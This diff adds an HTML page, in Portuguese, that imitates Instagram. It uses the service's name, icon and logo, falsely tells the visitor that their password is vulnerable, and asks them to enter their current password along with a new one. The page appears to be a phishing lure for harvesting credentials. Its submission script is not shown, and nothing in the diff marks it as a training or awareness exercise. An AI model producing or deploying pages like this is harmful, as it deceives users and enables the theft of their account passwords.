@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="icon" href="./assets/fotos/Instagram_icon.png">
+    <link rel="stylesheet" href="./src/css/style.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
+</head>
+<body>
+    <header id="header" class="py-4 bg-white border-bottom">
+        <div class="container">
+            <img src="https://logosmarcas.net/wp-content/uploads/2020/04/Instagram-Logo.png" alt="Logo" class="logo" height="60px">
+        </div>
+    </header>
+    <div class="container mt-5">
+        <div class="row justify-content-center col-6 container-smartphone">
+            <div class="col-md-8 container-body">
+                <div class="text-center mb-4 ">
+                    <h1 id="cadeado" class="bi bi-exclamation-octagon"></h1>
+                    <h2 id="txt-problema">Sua senha está vulnerável</h2>
+                    <p id="txt-email">Altere sua senha para maior segurança da sua conta.</p>
+                </div>
+                <form action="">
+                    <input type="text" class="form-control mb-3" name="senhaAtual" id="input-senha-atual" placeholder="Digite sua senha atual" required />
+                    <input type="text" class="form-control mb-3" name="novaSenha" id="input-nova-senha" placeholder="Digite sua nova senha" required />
+                    <input type="text" class="form-control mb-3" name="confirmaSenha" id="input-confirma-senha" placeholder="Confirme sua nova senha" required />
+                    <input type="submit" class="btn btn-primary col-12" id="btn-enviar" value="Enviar" />
+                    <a href="#" class="d-block mt-3">Não consegue redefinir sua senha?</a>
+                </form>                
+            </div>
+        </div>
+    </div>
+
+<script src="./src/js/script.js"></script>
+</body>
+</html>
